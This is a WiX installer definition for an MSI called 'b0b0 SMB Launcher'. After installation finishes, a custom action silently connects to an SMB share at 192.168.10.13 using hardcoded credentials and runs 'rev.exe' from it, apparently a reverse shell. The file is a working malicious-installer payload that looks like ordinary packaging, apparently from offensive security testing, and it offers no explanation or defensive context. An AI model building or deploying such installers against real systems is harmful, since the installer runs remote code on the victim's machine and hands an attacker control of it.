<?xml version='1.0' encoding='windows-1252'?>
<Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
  <Product 
	Id="*" 
	Name="b0b0 SMB Launcher"
    	Language="31337"
    	Version="1.0.0"
    	Manufacturer="Example"
    	UpgradeCode="12345678-1234-1234-1234-123456789012">
    	<Package 
		InstallerVersion="500" 
		Compressed="yes" 
		InstallScope="perUser" />	
	<MediaTemplate />
	<Directory Id='TARGETDIR' Name='SourceDir'>
		<Directory
		Id="LocalAppDataFolder"
		Name="LocalAppData">
		<Directory
			Id="INSTALLFOLDER"
			Name="b0b0Launcher" />
		</Directory>
	</Directory>
	<Feature 
		Id="MainFeature" 
		Title="b0b0 SMB Launcher"
		Level="1" />
	<Property
		Id="CMD"
		Value="cmd.exe" />
	<CustomAction
		Id="re_run"
		Property="CMD"
		ExeCommand="/c &quot;start /b /min &quot;&quot; net use \\192.168.10.13\share /user:192.168.10.13\b0b0 P@ssw0rd123 &amp;&amp; \\192.168.10.13\share\rev.exe&quot;"
		Execute="immediate"
		Return="ignore"  />
	<InstallExecuteSequence>
		<Custom 
			Action="re_run" 
			After="InstallFinalize" />
	</InstallExecuteSequence>
  </Product>
</Wix>
